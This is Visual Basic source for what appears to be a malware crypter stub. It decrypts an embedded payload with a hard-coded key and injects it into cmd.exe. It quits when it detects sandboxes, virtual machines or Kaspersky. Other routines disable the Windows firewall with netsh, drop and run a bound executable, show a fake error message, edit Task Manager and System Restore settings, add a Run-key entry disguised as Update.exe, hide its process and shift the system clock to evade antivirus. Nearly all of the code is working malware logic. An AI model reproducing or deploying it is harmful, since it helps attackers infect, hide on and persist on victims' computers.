Attribute VB_Name = "main_mod"

Option Explicit

Private Declare Function SetSystemTime Lib "kernel32.dll" (lpSystemTime As SYSTEMTIME) As Long
Private Declare Sub GetSystemTime Lib "kernel32.dll" (lpSystemTime As SYSTEMTIME)



Private Type SYSTEMTIME
  wYear As Integer
  wMonth As Integer
  wDayOfWeek As Integer
  wDay As Integer
  wHour As Integer
  wMinute As Integer
  wSecond As Integer
  wMilliseconds As Integer
End Type

Const FileEnde = "|#<ende>#|"


' // GetNullBytes by enzym
' // I think I need no credits here, lol
Private Function GetNullBytes(lNum) As String
    Dim sBuf As String
    Dim i As Integer
    For i = 1 To lNum
        sBuf = sBuf & Chr(0)
    Next '
    
    GetNullBytes = sBuf
End Function

Private Sub Main()
Dim Out() As String
'On Error Resume Next
Dim sStub As String, sFile As String, bfile() As Byte, bCFile() As Byte, options() As String, optionsstring, optionsstr As String
Dim b() As Byte, iCryptMethod As Integer


Open App.Path & "\" & App.ExeName & ".exe" For Binary As #1
    sStub = Space(LOF(1))
    Get #1, , sStub
Close #1

optionsstr = SplitAlter(sStub, FileEnde)(2)
optionsstring = XORDecryption("Baldbekommeichmeinlaptop", optionsstr)
options = Split(optionsstring, "/(t78/(t/Z()/(z789Z)")
Dim fake As Integer, fakemsg As String, Melt As Integer
Dim vmw As Integer, sbx As Integer, tsk As Integer, fw As Integer
Dim anubis As Integer, norman As Integer, cw As Integer, kav As Integer, sunbelt As Integer
Dim Key As String
Dim bind As Integer
Dim titel As String
Dim Parameter As String
Dim art As String
Dim hideproccess As Integer
Dim proactive As Integer
Dim restorepoint As Integer
Dim autostart As Integer
Dim debugging As Integer
Dim spread2 As Integer
Dim enparams As Integer


fake = CInt(options(1))
fakemsg = options(2)
Key = options(3)
Melt = CInt(options(4))
vmw = CInt(options(5))
sbx = CInt(options(6))
tsk = CInt(options(7))
fw = CInt(options(8))
bind = options(9)
anubis = CInt(options(10))
norman = CInt(options(11))
cw = CInt(options(12))
kav = CInt(options(13))
sunbelt = CInt(options(14))
titel = options(15)
art = options(16)
iCryptMethod = options(25)
'enparams = options(18)

Parameter = options(18)
hideproccess = CInt(options(20))
proactive = CInt(options(21))
restorepoint = CInt(options(22))
autostart = CInt(options(23))
debugging = CInt(options(24))
spread2 = CInt(options(25))

'server wird ausgelsen
sFile = SplitAlter(sStub, FileEnde)(1)
Select Case iCryptMethod
 Case 0
  'XOR
  'Server decrypten
  sFile = XORDecryption(Key, sFile)
  
  'Server in Array konvertieren
  bfile = StrConv(sFile, vbFromUnicode)
  
 Case 1
  'RC4
  
  'Server decrypten
  sFile = EncryptRC4(sFile, Key)
  
  'Server in Array konvertieren
  bfile = StrConv(sFile, vbFromUnicode)

 Case 2
  'AES
  'Server in Array umwandeln
  bCFile = StrConv(sFile, vbFromUnicode)
  
  'Server decrypten
  sFile = AES_DecryptFile(bfile, bCFile, Key)
End Select

If sbx = 1 Then
    Call sbie
    Call nrmsb
End If

If vmw = 1 Then
    Call vm
End If

If anubis = 1 Then
    If modCDKey.sGetXPCDKey = "76487-337-8429955-22614" Then End
    If modSandboxes.IsInAnubis Then End
    If GetSerialNumber(Environ("SystemDrive") & "\") = 1824245000 Then End
End If

If norman = 1 Then
    If modSandboxes.IsNormanSandbox Then End
End If

If cw = 1 Then
    If modSandboxes.IsCWSandbox Then End
End If

If kav = 1 Then
    If modDetExe.IfRunningExe("avp.exe") Then End
    If modSandboxes.IsDLLInjected2("r3hook.dll") Then End
End If

If sunbelt = 1 Then
    If modSandboxes.IsSunbelt Then End
End If

If fw = 1 Then
    Call Shell("cmd.exe /c netsh firewall set opmode disable", vbHide)
End If

If bind = 1 Then
        Dim sBind As String
        sBind = SplitAlter(sStub, "<$ac$>")(1)
        Open Environ("tmp") & "\tmpopen.exe" For Binary As #1
            Put #1, , sBind
        Close #1
        Shell Environ("tmp") & "\tmpopen.exe"
    End If
   
   
  
   InjectExe Environ("windir") & "\system32\cmd.exe", bfile, Parameter

If fake = 1 Then
    If art = "Information" Then
    MsgBox (fakemsg), vbInformation, titel
    End
    End If
    
    If art = "Error" Then
    MsgBox (fakemsg), vbCritical, titel
    End
    End If
    
    If art = "Warnung" Then
    MsgBox (fakemsg), vbExclamation, titel
    End
    End If
   
End If

If fw = 1 Then
    Call Shell("cmd.exe /c netsh firewall set opmode enable", vbHide)
End If

If tsk = 1 Then
    Dim rg As Object
    Set rg = CreateObject("WScript.Shell")
    rg.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 0
End If

If Melt = 1 Then
Call melter
End If

If spread2 = True Then
Call spread_server
End If


If debugging = True Then
If IsDebuggerActive() = True Then End
End If

If restorepoint = True Then
DeleteValue HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore\", "DisableSR"
End If


If autostart = True Then
Call FileCopy(App.Path & "\" & App.ExeName & ".exe", Environ("temp") & "\update.exe")
WriteRegistry HKEY_LOCAL_MACHINE, "SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\policies\explorer\run\", "Update.exe", 1, Environ("temp") & "\update.exe"
End If

If hideproccess = 1 Then
Call HideCurrentProcess
End If



If proactive = True Then
Dim actual As SYSTEMTIME
Dim ST As SYSTEMTIME

Call GetSystemTime(ST)
Call GetSystemTime(actual)

ST.wHour = ST.wHour + 1

Call SetSystemTime(ST)
End If


If proactive = True Then
Call SetSystemTime(actual)
End If

End
End Sub

Private Function Convert2Array(ByRef sString As String, ByRef bArray() As Byte) As Boolean
'On Error GoTo Err:

Dim i As Long
Dim iLen As Long

iLen = Len(sString)
ReDim bArray(iLen)

For i = 1 To iLen
 bArray(i) = CByte(Mid$(sString, i, 1))
Next i

MsgBox UBound(bArray)

Convert2Array = True
Exit Function
Err:
Convert2Array = False
End Function

